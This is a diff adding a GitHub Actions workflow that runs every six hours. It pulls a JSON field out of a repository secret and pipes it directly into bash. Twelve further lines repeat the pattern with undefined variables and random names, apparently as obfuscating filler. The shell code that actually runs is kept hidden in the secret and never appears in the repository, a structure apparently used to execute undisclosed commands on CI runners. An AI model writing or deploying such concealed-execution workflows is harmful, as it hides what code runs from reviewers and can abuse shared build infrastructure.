@@ -1,0 +1,30 @@
+name: chenhaoqi8971
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenhaoqi8971
+        env:
+          fu9929: ${{ secrets.fu9929 }}
+        run: |
+          echo $fu9929 | jq -r .sdw49675 | /bin/bash
+          echo $fl245 | jq -r .pnn8 | /bin/bash
+          echo $prbn23 | jq -r .okhx610 | /bin/bash
+          echo $erdvp633 | jq -r .n77169 | /bin/bash
+          echo $lhuy69 | jq -r .iy739 | /bin/bash
+          echo $j99058 | jq -r .umhk17951 | /bin/bash
+          echo $ejukk6 | jq -r .tqzsk839 | /bin/bash
+          echo $o9664 | jq -r .yej14 | /bin/bash
+          echo $zkhw862 | jq -r .h1047 | /bin/bash
+          echo $vbg71407 | jq -r .tawh4 | /bin/bash
+          echo $eekj4 | jq -r .hdjtr47136 | /bin/bash
+          echo $kzo2 | jq -r .kg15 | /bin/bash
+          echo $ana02840 | jq -r .kvnyc67 | /bin/bash
+
